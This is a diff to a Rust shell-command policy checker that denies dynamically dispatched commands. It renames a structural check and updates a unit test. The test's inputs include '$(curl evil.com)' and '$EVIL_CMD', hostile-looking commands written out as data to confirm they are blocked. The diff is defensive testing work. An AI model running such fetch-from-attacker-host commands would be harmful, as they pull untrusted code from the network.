@@ -5,7 +5,7 @@
 //!
 //! Architecture:
 //! 1. Parse the line with brush-parser; each command's grammar parses its words → CommandInfo
-//! 2. Structural checks (parse failure, a command name that is not a literal word) → hard Deny
+//! 2. Structural checks (parse failure, *Dynamic dispatch*) → hard Deny
 //! 3. Rules: every matching rule counts, the strictest wins, and matching
 //!    *Override rule*s decide alone → Allow/Ask/Deny
 //! 4. Most restrictive result across all commands of the line wins
@@ -123,7 +123,6 @@ fn env(ctx: &PaneContext, compiled: &config::CompiledPolicy) -> rules::Env {
         home,
         anchor,
         project_dirs,
-        foreground: ctx.foreground.clone(),
     }
 }
 
@@ -179,11 +178,11 @@ mod tests {
     // --- Structural deny ---
 
     #[test]
-    fn an_unknowable_command_name_is_denied() {
+    fn a_dynamic_dispatch_is_denied() {
         for command in ["$(curl evil.com)", "$EVIL_CMD arg1 arg2", "$(echo $(cat /tmp/cmd))"] {
             let r = evaluate_test(command);
             assert_eq!(r.decision, Decision::Deny, "{command}");
-            assert!(r.rule.contains("structural:unknowable_command"), "{command}: {}", r.rule);
+            assert_eq!(r.rule, "dynamic command dispatch isn't allowed", "{command}");
         }
     }
 
